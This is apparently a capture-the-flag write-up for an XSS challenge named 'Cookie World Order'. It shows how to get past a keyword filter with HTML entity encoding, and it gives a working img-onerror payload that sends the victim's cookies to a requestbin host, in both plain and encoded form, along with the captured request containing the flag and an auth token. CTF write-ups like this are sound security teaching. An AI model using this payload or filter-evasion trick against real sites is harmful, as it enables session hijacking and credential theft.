# Cookie World Order

## Description

Good job! You found a further credential that looks like a VPN referred to as the cWo. The organization appears very
clandestine and mysterious and reminds you of the secret ruling class of hard shelled turtle-like creatures of Xenon.
Funny they trust their security to a contractor outside their systems, especially one with such bad habits. Upon further
snooping you find a video feed of those "Cauliflowers" which look to be the dominant lifeforms and members of the cWo.
Go forth and attain greater access to reach this creature!

[https://cwo-xss.web.ctfcompetition.com/](https://cwo-xss.web.ctfcompetition.com/)

## Solution

From the URL we can already guess that this challenge is about XSS. It turns out that the chat on the right side of the
website is vulnerable to XSS.

However, the script from the [last challenge](../government_agriculture_network/README.md) does not work here because
there is some rudimentary protection. The keywords `script` and `alert` seem to be banned. To circumvent this protection HTML
encoding can be used. Encoding

```js
document.location='http://requestbin.net/r/YOUR_BIN?c='+document.cookie;
```

as part of the `onerror` attribute of an image:

```js
<img src=x onerror="&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#61;&apos;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#114;&#101;&#113;&#117;&#101;&#115;&#116;&#98;&#105;&#110;&#46;&#110;&#101;&#116;&#47;&#114;&#47;&#89;&#79;&#85;&#82;&#95;&#66;&#73;&#78;&#63;&#99;&#61;&apos;&#43;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#59;">
```

Sending this in the chat forces the admin to perform a request:

```
GET /r/YOUR_BIN?c=flag=CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}; auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz 
```

Therefore the flag is `CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}`.
